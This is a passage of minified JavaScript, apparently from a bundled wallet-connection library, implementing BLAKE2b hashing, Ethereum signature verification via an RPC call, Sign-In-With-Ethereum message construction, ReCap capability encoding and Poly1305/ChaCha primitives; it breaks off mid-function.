Wc{constructor(){super(48),this.Ah=Le[0]|0,this.Al=Le[1]|0,this.Bh=Le[2]|0,this.Bl=Le[3]|0,this.Ch=Le[4]|0,this.Cl=Le[5]|0,this.Dh=Le[6]|0,this.Dl=Le[7]|0,this.Eh=Le[8]|0,this.El=Le[9]|0,this.Fh=Le[10]|0,this.Fl=Le[11]|0,this.Gh=Le[12]|0,this.Gl=Le[13]|0,this.Hh=Le[14]|0,this.Hl=Le[15]|0}}const je=Uint32Array.from([573645204,4230739756,2673172387,3360449730,596883563,1867755857,2520282905,1497426621,2519219938,2827943907,3193839141,1401305490,721525244,746961066,246885852,2177182882]);class F3 extends Wc{constructor(){super(32),this.Ah=je[0]|0,this.Al=je[1]|0,this.Bh=je[2]|0,this.Bl=je[3]|0,this.Ch=je[4]|0,this.Cl=je[5]|0,this.Dh=je[6]|0,this.Dl=je[7]|0,this.Eh=je[8]|0,this.El=je[9]|0,this.Fh=je[10]|0,this.Fl=je[11]|0,this.Gh=je[12]|0,this.Gl=je[13]|0,this.Hh=je[14]|0,this.Hl=je[15]|0}}const eo=Ui(()=>new N3),j3=Ui(()=>new Wc),q3=Ui(()=>new L3),z3=Ui(()=>new F3),V3=Uint8Array.from([0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13,2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9,12,5,1,15,14,13,4,10,0,7,6,3,9,2,8,11,13,11,7,14,12,1,3,9,5,0,15,4,8,6,2,10,6,15,14,9,11,3,0,8,12,2,13,7,1,4,10,5,10,2,8,4,7,6,1,5,15,11,9,14,3,12,13,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13,2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9]),ve=Uint32Array.from([4089235720,1779033703,2227873595,3144134277,4271175723,1013904242,1595750129,2773480762,2917565137,1359893119,725511199,2600822924,4215389547,528734635,327033209,1541459225]),W=new Uint32Array(32);function wn(t,e,n,r,i,s){const o=i[s],a=i[s+1];let c=W[2*t],l=W[2*t+1],u=W[2*e],h=W[2*e+1],f=W[2*n],p=W[2*n+1],d=W[2*r],g=W[2*r+1],w=qc(c,u,o);l=zc(w,l,h,a),c=w|0,{Dh:g,Dl:d}={Dh:g^l,Dl:d^c},{Dh:g,Dl:d}={Dh:c3(g,d),Dl:l3(g)},{h:p,l:f}=Ot(p,f,g,d),{Bh:h,Bl:u}={Bh:h^p,Bl:u^f},{Bh:h,Bl:u}={Bh:En(h,u,24),Bl:xn(h,u,24)},W[2*t]=c,W[2*t+1]=l,W[2*e]=u,W[2*e+1]=h,W[2*n]=f,W[2*n+1]=p,W[2*r]=d,W[2*r+1]=g}function bn(t,e,n,r,i,s){const o=i[s],a=i[s+1];let c=W[2*t],l=W[2*t+1],u=W[2*e],h=W[2*e+1],f=W[2*n],p=W[2*n+1],d=W[2*r],g=W[2*r+1],w=qc(c,u,o);l=zc(w,l,h,a),c=w|0,{Dh:g,Dl:d}={Dh:g^l,Dl:d^c},{Dh:g,Dl:d}={Dh:En(g,d,16),Dl:xn(g,d,16)},{h:p,l:f}=Ot(p,f,g,d),{Bh:h,Bl:u}={Bh:h^p,Bl:u^f},{Bh:h,Bl:u}={Bh:li(h,u,63),Bl:ui(h,u,63)},W[2*t]=c,W[2*t+1]=l,W[2*e]=u,W[2*e+1]=h,W[2*n]=f,W[2*n+1]=p,W[2*r]=d,W[2*r+1]=g}function W3(t,e={},n,r,i){if(ln(n),t<0||t>n)throw new Error("outputLen bigger than keyLen");const{key:s,salt:o,personalization:a}=e;if(s!==void 0&&(s.length<1||s.length>n))throw new Error("key length must be undefined or 1.."+n);if(o!==void 0&&o.length!==r)throw new Error("salt must be undefined or "+r);if(a!==void 0&&a.length!==i)throw new Error("personalization must be undefined or "+i)}class K3 extends Qs{constructor(e,n){super(),this.finished=!1,this.destroyed=!1,this.length=0,this.pos=0,ln(e),ln(n),this.blockLen=e,this.outputLen=n,this.buffer=new Uint8Array(e),this.buffer32=Si(this.buffer)}update(e){Tn(this),e=Ct(e),Pt(e);const{blockLen:n,buffer:r,buffer32:i}=this,s=e.length,o=e.byteOffset,a=e.buffer;for(let c=0;c<s;){this.pos===n&&(_n(i),this.compress(i,0,!1),_n(i),this.pos=0);const l=Math.min(n-this.pos,s-c),u=o+c;if(l===n&&!(u%4)&&c+l<s){const h=new Uint32Array(a,u,Math.floor((s-c)/4));_n(h);for(let f=0;c+n<s;f+=i.length,c+=n)this.length+=n,this.compress(h,f,!1);_n(h);continue}r.set(e.subarray(c,c+l),this.pos),this.pos+=l,this.length+=l,c+=l}return this}digestInto(e){Tn(this),Vc(e,this);const{pos:n,buffer32:r}=this;this.finished=!0,_t(this.buffer.subarray(n)),_n(r),this.compress(r,0,!0),_n(r);const i=Si(e);this.get().forEach((s,o)=>i[o]=Jt(s))}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}_cloneInto(e){const{buffer:n,length:r,finished:i,destroyed:s,outputLen:o,pos:a}=this;return e||(e=new this.constructor({dkLen:o})),e.set(...this.get()),e.buffer.set(n),e.destroyed=s,e.finished=i,e.length=r,e.pos=a,e.outputLen=o,e}clone(){return this._cloneInto()}}class H3 extends K3{constructor(e={}){const n=e.dkLen===void 0?64:e.dkLen;super(128,n),this.v0l=ve[0]|0,this.v0h=ve[1]|0,this.v1l=ve[2]|0,this.v1h=ve[3]|0,this.v2l=ve[4]|0,this.v2h=ve[5]|0,this.v3l=ve[6]|0,this.v3h=ve[7]|0,this.v4l=ve[8]|0,this.v4h=ve[9]|0,this.v5l=ve[10]|0,this.v5h=ve[11]|0,this.v6l=ve[12]|0,this.v6h=ve[13]|0,this.v7l=ve[14]|0,this.v7h=ve[15]|0,W3(n,e,64,16,16);let{key:r,personalization:i,salt:s}=e,o=0;if(r!==void 0&&(r=Ct(r),o=r.length),this.v0l^=this.outputLen|o<<8|65536|1<<24,s!==void 0){s=Ct(s);const a=Si(s);this.v4l^=Jt(a[0]),this.v4h^=Jt(a[1]),this.v5l^=Jt(a[2]),this.v5h^=Jt(a[3])}if(i!==void 0){i=Ct(i);const a=Si(i);this.v6l^=Jt(a[0]),this.v6h^=Jt(a[1]),this.v7l^=Jt(a[2]),this.v7h^=Jt(a[3])}if(r!==void 0){const a=new Uint8Array(this.blockLen);a.set(r),this.update(a)}}get(){let{v0l:e,v0h:n,v1l:r,v1h:i,v2l:s,v2h:o,v3l:a,v3h:c,v4l:l,v4h:u,v5l:h,v5h:f,v6l:p,v6h:d,v7l:g,v7h:w}=this;return[e,n,r,i,s,o,a,c,l,u,h,f,p,d,g,w]}set(e,n,r,i,s,o,a,c,l,u,h,f,p,d,g,w){this.v0l=e|0,this.v0h=n|0,this.v1l=r|0,this.v1h=i|0,this.v2l=s|0,this.v2h=o|0,this.v3l=a|0,this.v3h=c|0,this.v4l=l|0,this.v4h=u|0,this.v5l=h|0,this.v5h=f|0,this.v6l=p|0,this.v6h=d|0,this.v7l=g|0,this.v7h=w|0}compress(e,n,r){this.get().forEach((c,l)=>W[l]=c),W.set(ve,16);let{h:i,l:s}=Dp(BigInt(this.length));W[24]=ve[8]^s,W[25]=ve[9]^i,r&&(W[28]=~W[28],W[29]=~W[29]);let o=0;const a=V3;for(let c=0;c<12;c++)wn(0,4,8,12,e,n+2*a[o++]),bn(0,4,8,12,e,n+2*a[o++]),wn(1,5,9,13,e,n+2*a[o++]),bn(1,5,9,13,e,n+2*a[o++]),wn(2,6,10,14,e,n+2*a[o++]),bn(2,6,10,14,e,n+2*a[o++]),wn(3,7,11,15,e,n+2*a[o++]),bn(3,7,11,15,e,n+2*a[o++]),wn(0,5,10,15,e,n+2*a[o++]),bn(0,5,10,15,e,n+2*a[o++]),wn(1,6,11,12,e,n+2*a[o++]),bn(1,6,11,12,e,n+2*a[o++]),wn(2,7,8,13,e,n+2*a[o++]),bn(2,7,8,13,e,n+2*a[o++]),wn(3,4,9,14,e,n+2*a[o++]),bn(3,4,9,14,e,n+2*a[o++]);this.v0l^=W[0]^W[16],this.v0h^=W[1]^W[17],this.v1l^=W[2]^W[18],this.v1h^=W[3]^W[19],this.v2l^=W[4]^W[20],this.v2h^=W[5]^W[21],this.v3l^=W[6]^W[22],this.v3h^=W[7]^W[23],this.v4l^=W[8]^W[24],this.v4h^=W[9]^W[25],this.v5l^=W[10]^W[26],this.v5h^=W[11]^W[27],this.v6l^=W[12]^W[28],this.v6h^=W[13]^W[29],this.v7l^=W[14]^W[30],this.v7h^=W[15]^W[31],_t(W)}destroy(){this.destroyed=!0,_t(this.buffer32),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}}const G3=v3(t=>new H3(t)),Y3="https://rpc.walletconnect.org/v1";function Lp(t){const e=`Ethereum Signed Message:
${t.length}`,n=new TextEncoder().encode(e+t);return"0x"+Buffer.from(P3(n)).toString("hex")}async function Z3(t,e,n,r,i,s){switch(n.t){case"eip191":return await X3(t,e,n.s);case"eip1271":return await J3(t,e,n.s,r,i,s);default:throw new Error(`verifySignature failed: Attempted to verify CacaoSignature with unknown type: ${n.t}`)}}function X3(t,e,n){const r=R2(n);return H2({payload:Lp(e),signature:r}).toLowerCase()===t.toLowerCase()}async function J3(t,e,n,r,i,s){const o=fs(r);if(!o.namespace||!o.reference)throw new Error(`isValidEip1271Signature failed: chainId must be in CAIP-2 format, received: ${r}`);try{const a="0x1626ba7e",c="0000000000000000000000000000000000000000000000000000000000000040",l=n.substring(2),u=(l.length/2).toString(16).padStart(64,"0"),h=(e.startsWith("0x")?e:Lp(e)).substring(2),f=a+h+c+u+l,p=await fetch(`${s||Y3}/?chainId=${r}&projectId=${i}`,{headers:{"Content-Type":"application/json"},method:"POST",body:JSON.stringify({id:Q3(),jsonrpc:"2.0",method:"eth_call",params:[{to:t,data:f},"latest"]})}),{result:d}=await p.json();return d?d.slice(0,a.length).toLowerCase()===a.toLowerCase():!1}catch(a){return console.error("isValidEip1271Signature: ",a),!1}}function Q3(){return Date.now()+Math.floor(Math.random()*1e3)}function e_(t){const e=atob(t),n=new Uint8Array(e.length);for(let o=0;o<e.length;o++)n[o]=e.charCodeAt(o);const r=n[0];if(r===0)throw new Error("No signatures found");const i=1+r*64;if(n.length<i)throw new Error("Transaction data too short for claimed signature count");if(n.length<100)throw new Error("Transaction too short");const s=Buffer.from(t,"base64").slice(1,65);return Ri.encode(s)}function t_(t){const e=new Uint8Array(Buffer.from(t,"base64")),n=Array.from("TransactionData::").map(s=>s.charCodeAt(0)),r=new Uint8Array(n.length+e.length);r.set(n),r.set(e,n.length);const i=G3(r,{dkLen:32});return Ri.encode(i)}function nh(t){const e=new Uint8Array(eo(n_(t)));return Ri.encode(e)}function n_(t){if(t instanceof Uint8Array)return t;if(Array.isArray(t))return new Uint8Array(t);if(typeof t=="object"&&t!=null&&t.data)return new Uint8Array(Object.values(t.data));if(typeof t=="object"&&t)return new Uint8Array(Object.values(t));throw new Error("getNearUint8ArrayFromBytes: Unexpected result type from bytes array")}function rh(t){const e=Buffer.from(t,"base64"),n=TE(e).txn;if(!n)throw new Error("Invalid signed transaction: missing 'txn' field");const r=_E(n),i=Buffer.from("TX"),s=Buffer.concat([i,Buffer.from(r)]),o=z3(s);return K2.encode(o).replace(/=+$/,"")}function Yo(t){const e=[];let n=BigInt(t);for(;n>=BigInt(128);)e.push(Number(n&BigInt(127)|BigInt(128))),n>>=BigInt(7);return e.push(Number(n)),Buffer.from(e)}function r_(t){const e=Buffer.from(t.signed.bodyBytes,"base64"),n=Buffer.from(t.signed.authInfoBytes,"base64"),r=Buffer.from(t.signature.signature,"base64"),i=[];i.push(Buffer.from([10])),i.push(Yo(e.length)),i.push(e),i.push(Buffer.from([18])),i.push(Yo(n.length)),i.push(n),i.push(Buffer.from([26])),i.push(Yo(r.length)),i.push(r);const s=Buffer.concat(i),o=eo(s);return Buffer.from(o).toString("hex").toUpperCase()}function i_(t){var e,n;const r=[];try{if(typeof t=="string")return r.push(t),r;if(typeof t!="object")return r;t!=null&&t.id&&r.push(t.id);const i=(n=(e=t?.capabilities)==null?void 0:e.caip345)==null?void 0:n.transactionHashes;i&&r.push(...i)}catch(i){console.warn("getWalletSendCallsHashes failed: ",i)}return r}var s_=Object.defineProperty,o_=Object.defineProperties,a_=Object.getOwnPropertyDescriptors,ih=Object.getOwnPropertySymbols,c_=Object.prototype.hasOwnProperty,l_=Object.prototype.propertyIsEnumerable,sh=(t,e,n)=>e in t?s_(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,u_=(t,e)=>{for(var n in e||(e={}))c_.call(e,n)&&sh(t,n,e[n]);if(ih)for(var n of ih(e))l_.call(e,n)&&sh(t,n,e[n]);return t},h_=(t,e)=>o_(t,a_(e));const Fp="did:pkh:",f_={eip155:"Ethereum",solana:"Solana",bip122:"Bitcoin"},d_=t=>t?f_[t]||t:"",to=t=>t?.split(":"),p_=t=>{const e=t&&to(t);if(e)return t.includes(Fp)?e[3]:e[1]},g_=t=>{const e=t&&to(t);if(e)return t.includes(Fp)?e[2]:e[0]},Fa=t=>{const e=t&&to(t);if(e)return e[2]+":"+e[3]},Bs=t=>{const e=t&&to(t);if(e)return e.pop()};async function oh(t){const{cacao:e,projectId:n}=t,{s:r,p:i}=e,s=jp(i,i.iss),o=Bs(i.iss);return await Z3(o,s,r,Fa(i.iss),n)}const jp=(t,e)=>{const n=g_(e);if(!n)throw new Error("Invalid issuer: "+e);const r=`${t.domain} wants you to sign in with your ${d_(n)} account:`,i=Bs(e);if(!t.aud&&!t.uri)throw new Error("Either `aud` or `uri` is required to construct the message");let s=t.statement||void 0;const o=`URI: ${t.aud||t.uri}`,a=`Version: ${t.version}`,c=`Chain ID: ${p_(e)}`,l=`Nonce: ${t.nonce}`,u=`Issued At: ${t.iat}`,h=t.exp?`Expiration Time: ${t.exp}`:void 0,f=t.nbf?`Not Before: ${t.nbf}`:void 0,p=t.requestId?`Request ID: ${t.requestId}`:void 0,d=t.resources?`Resources:${t.resources.map(w=>`
- ${w}`).join("")}`:void 0,g=ds(t.resources);if(g){const w=Di(g);s=I_(s,w)}return[r,i,"",s,"",o,a,c,l,u,h,f,p,d].filter(w=>w!=null).join(`
`)};function y_(t){return Buffer.from(JSON.stringify(t)).toString("base64")}function m_(t){return JSON.parse(Buffer.from(t,"base64").toString("utf-8"))}function sr(t){if(!t)throw new Error("No recap provided, value is undefined");if(!t.att)throw new Error("No `att` property found");const e=Object.keys(t.att);if(!(e!=null&&e.length))throw new Error("No resources found in `att` property");e.forEach(n=>{const r=t.att[n];if(Array.isArray(r))throw new Error(`Resource must be an object: ${n}`);if(typeof r!="object")throw new Error(`Resource must be an object: ${n}`);if(!Object.keys(r).length)throw new Error(`Resource object is empty: ${n}`);Object.keys(r).forEach(i=>{const s=r[i];if(!Array.isArray(s))throw new Error(`Ability limits ${i} must be an array of objects, found: ${s}`);if(!s.length)throw new Error(`Value of ${i} is empty array, must be an array with objects`);s.forEach(o=>{if(typeof o!="object")throw new Error(`Ability limits (${i}) must be an array of objects, found: ${o}`)})})})}function w_(t,e,n,r={}){return n?.sort((i,s)=>i.localeCompare(s)),{att:{[t]:b_(e,n,r)}}}function b_(t,e,n={}){e=e?.sort((i,s)=>i.localeCompare(s));const r=e.map(i=>({[`${t}/${i}`]:[n]}));return Object.assign({},...r)}function qp(t){return sr(t),`urn:recap:${y_(t).replace(/=/g,"")}`}function Di(t){const e=m_(t.replace("urn:recap:",""));return sr(e),e}function v_(t,e,n){const r=w_(t,e,n);return qp(r)}function E_(t){return t&&t.includes("urn:recap:")}function x_(t,e){const n=Di(t),r=Di(e),i=__(n,r);return qp(i)}function __(t,e){sr(t),sr(e);const n=Object.keys(t.att).concat(Object.keys(e.att)).sort((i,s)=>i.localeCompare(s)),r={att:{}};return n.forEach(i=>{var s,o;Object.keys(((s=t.att)==null?void 0:s[i])||{}).concat(Object.keys(((o=e.att)==null?void 0:o[i])||{})).sort((a,c)=>a.localeCompare(c)).forEach(a=>{var c,l;r.att[i]=h_(u_({},r.att[i]),{[a]:((c=t.att[i])==null?void 0:c[a])||((l=e.att[i])==null?void 0:l[a])})})}),r}function I_(t="",e){sr(e);const n="I further authorize the stated URI to perform the following actions on my behalf: ";if(t.includes(n))return t;const r=[];let i=0;Object.keys(e.att).forEach(a=>{const c=Object.keys(e.att[a]).map(h=>({ability:h.split("/")[0],action:h.split("/")[1]}));c.sort((h,f)=>h.action.localeCompare(f.action));const l={};c.forEach(h=>{l[h.ability]||(l[h.ability]=[]),l[h.ability].push(h.action)});const u=Object.keys(l).map(h=>(i++,`(${i}) '${h}': '${l[h].join("', '")}' for '${a}'.`));r.push(u.join(", ").replace(".,","."))});const s=r.join(" "),o=`${n}${s}`;return`${t?t+" ":""}${o}`}function ah(t){var e;const n=Di(t);sr(n);const r=(e=n.att)==null?void 0:e.eip155;return r?Object.keys(r).map(i=>i.split("/")[1]):[]}function ch(t){const e=Di(t);sr(e);const n=[];return Object.values(e.att).forEach(r=>{Object.values(r).forEach(i=>{var s;(s=i?.[0])!=null&&s.chains&&n.push(i[0].chains)})}),[...new Set(n.flat())]}function ds(t){if(!t)return;const e=t?.[t.length-1];return E_(e)?e:void 0}function zp(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function ja(t){if(typeof t!="boolean")throw new Error(`boolean expected, not ${t}`)}function Zo(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function tt(t,...e){if(!zp(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function lh(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function S_(t,e){tt(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}function Cn(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function Nr(...t){for(let e=0;e<t.length;e++)t[e].fill(0)}function D_(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}const A_=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function O_(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}function qa(t){if(typeof t=="string")t=O_(t);else if(zp(t))t=za(t);else throw new Error("Uint8Array expected, got "+typeof t);return t}function $_(t,e){if(e==null||typeof e!="object")throw new Error("options must be defined");return Object.assign(t,e)}function C_(t,e){if(t.length!==e.length)return!1;let n=0;for(let r=0;r<t.length;r++)n|=t[r]^e[r];return n===0}const P_=(t,e)=>{function n(r,...i){if(tt(r),!A_)throw new Error("Non little-endian hardware is not yet supported");if(t.nonceLength!==void 0){const l=i[0];if(!l)throw new Error("nonce / iv required");t.varSizeNonce?tt(l):tt(l,t.nonceLength)}const s=t.tagLength;s&&i[1]!==void 0&&tt(i[1]);const o=e(r,...i),a=(l,u)=>{if(u!==void 0){if(l!==2)throw new Error("cipher output not supported");tt(u)}};let c=!1;return{encrypt(l,u){if(c)throw new Error("cannot encrypt() twice with same key + nonce");return c=!0,tt(l),a(o.encrypt.length,u),o.encrypt(l,u)},decrypt(l,u){if(tt(l),s&&l.length<s)throw new Error("invalid ciphertext length: smaller than tagLength="+s);return a(o.decrypt.length,u),o.decrypt(l,u)}}}return Object.assign(n,t),n};function uh(t,e,n=!0){if(e===void 0)return new Uint8Array(t);if(e.length!==t)throw new Error("invalid output length, expected "+t+", got: "+e.length);if(n&&!B_(e))throw new Error("invalid output, must be aligned");return e}function hh(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),s=BigInt(4294967295),o=Number(n>>i&s),a=Number(n&s);t.setUint32(e+4,o,r),t.setUint32(e+0,a,r)}function T_(t,e,n){ja(n);const r=new Uint8Array(16),i=D_(r);return hh(i,0,BigInt(e),n),hh(i,8,BigInt(t),n),r}function B_(t){return t.byteOffset%4===0}function za(t){return Uint8Array.from(t)}const Vp=t=>Uint8Array.from(t.split("").map(e=>e.charCodeAt(0))),R_=Vp("expand 16-byte k"),k_=Vp("expand 32-byte k"),N_=Cn(R_),U_=Cn(k_);function ne(t,e){return t<<e|t>>>32-e}function Va(t){return t.byteOffset%4===0}const ts=64,M_=16,Wp=2**32-1,fh=new Uint32Array;function L_(t,e,n,r,i,s,o,a){const c=i.length,l=new Uint8Array(ts),u=Cn(l),h=Va(i)&&Va(s),f=h?Cn(i):fh,p=h?Cn(s):fh;for(let d=0;d<c;o++){if(t(e,n,r,u,o,a),o>=Wp)throw new Error("arx: counter overflow");const g=Math.min(ts,c-d);if(h&&g===ts){const w=d/4;if(d%4!==0)throw new Error("arx: invalid block position");for(let _=0,C;_<M_;_++)C=w+_,p[C]=f[C]^u[_];d+=ts;continue}for(let w=0,_;w<g;w++)_=d+w,s[_]=i[_]^l[w];d+=g}}function F_(t,e){const{allowShortKeys:n,extendNonceFn:r,counterLength:i,counterRight:s,rounds:o}=$_({allowShortKeys:!1,counterLength:8,counterRight:!1,rounds:20},e);if(typeof t!="function")throw new Error("core must be a function");return Zo(i),Zo(o),ja(s),ja(n),(a,c,l,u,h=0)=>{tt(a),tt(c),tt(l);const f=l.length;if(u===void 0&&(u=new Uint8Array(f)),tt(u),Zo(h),h<0||h>=Wp)throw new Error("arx: counter overflow");if(u.length<f)throw new Error(`arx: output (${u.length}) is shorter than data (${f})`);const p=[];let d=a.length,g,w;if(d===32)p.push(g=za(a)),w=U_;else if(d===16&&n)g=new Uint8Array(32),g.set(a),g.set(a,16),w=N_,p.push(g);else throw new Error(`arx: invalid 32-byte key, got length=${d}`);Va(c)||p.push(c=za(c));const _=Cn(g);if(r){if(c.length!==24)throw new Error("arx: extended nonce must be 24 bytes");r(w,_,Cn(c.subarray(0,16)),_),c=c.subarray(16)}const C=16-i;if(C!==c.length)throw new Error(`arx: nonce must be ${C} or 16 bytes`);if(C!==12){const b=new Uint8Array(12);b.set(c,s?0:12-c.length),c=b,p.push(c)}const v=Cn(c);return L_(t,w,_,v,l,u,h,o),Nr(...p),u}}const Pe=(t,e)=>t[e++]&255|(t[e++]&255)<<8;class j_{constructor(e){this.blockLen=16,this.outputLen=16,this.buffer=new Uint8Array(16),this.r=new Uint16Array(10),this.h=new Uint16Array(10),this.pad=new Uint16Array(8),this.pos=0,this.finished=!1,e=qa(e),tt(e,32);const n=Pe(e,0),r=Pe(e,2),i=Pe(e,4),s=Pe(e,6),o=Pe(e,8),a=Pe(e,10),c=Pe(e,12),l=Pe(e,14);this.r[0]=n&8191,this.r[1]=(n>>>13|r<<3)&8191,this.r[2]=(r>>>10|i<<6)&7939,this.r[3]=(i>>>7|s<<9)&8191,this.r[4]=(s>>>4|o<<12)&255,this.r[5]=o>>>1&8190,this.r[6]=(o>>>14|a<<2)&8191,this.r[7]=(a>>>11|c<<5)&8065,this.r[8]=(c>>>8|l<<8)&8191,this.r[9]=l>>>5&127;for(let u=0;u<8;u++)this.pad[u]=Pe(e,16+2*u)}process(e,n,r=!1){const i=r?0:2048,{h:s,r:o}=this,a=o[0],c=o[1],l=o[2],u=o[3],h=o[4],f=o[5],p=o[6],d=o[7],g=o[8],w=o[9],_=Pe(e,n+0),C=Pe(e,n+2),v=Pe(e,n+4),b=Pe(e,n+6),x=Pe(e,n+8),O=Pe(e,n+10),B=Pe(e,n+12),k=Pe(e,n+14);let $=s[0]+(_&8191),N=s[1]+((_>>>13|C<<3)&8191),E=s[2]+((C>>>10|v<<6)&8191),S=s[3]+((v>>>7|b<<9)&8191),D=s[4]+((b>>>4|x<<12)&8191),P=s[5]+(x>>>1&8191),y=s[6]+((x>>>14|O<<2)&8191),m=s[7]+((O>>>11|B<<5)&8191),I=s[8]+((B>>>8|k<<8)&8191),T=s[9]+(k>>>5|i),A=0,R=A+$*a+N*(5*w)+E*(5*g)+S*(5*d)+D*(5*p);A=R>>>13,R&=8191,R+=P*(5*f)+y*(5*h)+m*(5*u)+I*(5*l)+T*(5*c),A+=R>>>13,R&=8191;let U=A+$*c+N*a+E*(5*w)+S*(5*g)+D*(5*d);A=U>>>13,U&=8191,U+=P*(5*p)+y*(5*f)+m*(5*h)+I*(5*u)+T*(5*l),A+=U>>>13,U&=8191;let M=A+$*l+N*c+E*a+S*(5*w)+D*(5*g);A=M>>>13,M&=8191,M+=P*(5*d)+y*(5*p)+m*(5*f)+I*(5*h)+T*(5*u),A+=M>>>13,M&=8191;let q=A+$*u+N*l+E*c+S*a+D*(5*w);A=q>>>13,q&=8191,q+=P*(5*g)+y*(5*d)+m*(5*p)+I*(5*f)+T*(5*h),A+=q>>>13,q&=8191;let L=A+$*h+N*u+E*l+S*c+D*a;A=L>>>13,L&=8191,L+=P*(5*w)+y*(5*g)+m*(5*d)+I*(5*p)+T*(5*f),A+=L>>>13,L&=8191;let j=A+$*f+N*h+E*u+S*l+D*c;A=j>>>13,j&=8191,j+=P*a+y*(5*w)+m*(5*g)+I*(5*d)+T*(5*p),A+=j>>>13,j&=8191;let K=A+$*p+N*f+E*h+S*u+D*l;A=K>>>13,K&=8191,K+=P*c+y*a+m*(5*w)+I*(5*g)+T*(5*d),A+=K>>>13,K&=8191;let G=A+$*d+N*p+E*f+S*h+D*u;A=G>>>13,G&=8191,G+=P*l+y*c+m*a+I*(5*w)+T*(5*g),A+=G>>>13,G&=8191;let Z=A+$*g+N*d+E*p+S*f+D*h;A=Z>>>13,Z&=8191,Z+=P*u+y*l+m*c+I*a+T*(5*w),A+=Z>>>13,Z&=8191;let H=A+$*w+N*g+E*d+S*p+D*f;A=H>>>13,H&=8191,H+=P*h+y*u+m*l+I*c+T*a,A+=H>>>13,H&=8191,A=(A<<2)+A|0,A=A+R|0,R=A&8191,A=A>>>13,U+=A,s[0]=R,s[1]=U,s[2]=M,s[3]=q,s[4]=L,s[5]=j,s[6]=K,s[7]=G,s[8]=Z,s[9]=H}finalize(){const{h:e,pad:n}=this,r=new Uint16Array(10);let i=e[1]>>>13;e[1]&=8191;for(let a=2;a<10;a++)e[a]+=i,i=e[a]>>>13,e[a]&=8191;e[0]+=i*5,i=e[0]>>>13,e[0]&=8191,e[1]+=i,i=e[1]>>>13,e[1]&=8191,e[2]+=i,r[0]=e[0]+5,i=r[0]>>>13,r[0]&=8191;for(let a=1;a<10;a++)r[a]=e[a]+i,i=r[a]>>>13,r[a]&=8191;r[9]-=8192;let s=(i^1)-1;for(let a=0;a<10;a++)r[a]&=s;s=~s;for(let a=0;a<10;a++)e[a]=e[a]&s|r[a];e[0]=(e[0]|e[1]<<13)&65535,e[1]=(e[1]>>>3|e[2]<<10)&65535,e[2]=(e[2]>>>6|e[3]<<7)&65535,e[3]=(e[3]>>>9|e[4]<<4)&65535,e[4]=(e[4]>>>12|e[5]<<1|e[6]<<14)&65535,e[5]=(e[6]>>>2|e[7]<<11)&65535,e[6]=(e[7]>>>5|e[8]<<8)&65535,e[7]=(e[8]>>>8|e[9]<<5)&65535;let o=e[0]+n[0];e[0]=o&65535;for(let a=1;a<8;a++)o=(e[a]+n[a]|0)+(o>>>16)|0,e[a]=o&65535;Nr(r)}update(e){lh(this),e=qa(e),tt(e);const{buffer:n,blockLen:r}=this,i=e.length;for(let s=0;s<i;){const o=Math.min(r-this.pos,i-s);if(o===r){for(;r<=i-s;s+=r)this.process(e,s);continue}n.set(e.subarray(s,s+o),this.pos),this.pos+=o,s+=o,this.pos===r&&(this.process(n,0,!1),this.pos=0)}return this}destroy(){Nr(this.h,this.r,this.buffer,this.pad)}digestInto(e){lh(this),S_(e,this),this.finished=!0;const{buffer:n,h:r}=this;let{pos:i}=this;if(i){for(n[i++]=1;i<16;i++)n[i]=0;this.process(n,0,!0)}this.finalize();let s=0;for(let o=0;o<8;o++)e[s++]=r[o]>>>0,e[s++]=r[o]>>>8;return e}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}}function q_(t){const e=(r,i)=>t(i).update(qa(r)).digest(),n=t(new Uint8Array(32));return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=r=>t(r),e}const z_=q_(t=>new j_(t));function V_(t,e,n,r,i,s=20){let o=t[0],a=t[1],c=t[2],l=t[3],u=e[0],h=e[1],f=e[2],p=e[3],d=e[4],g=e[5],w=e[6],_=e[7],C=i,v=n[0],b=n[1],x=n[2],O=o,B=a,k=c,$=l,N=u,E=h,S=f,D=p,P=d,y=g,m=w,I=_,T=C,A=v,R=b,U=x;for(let 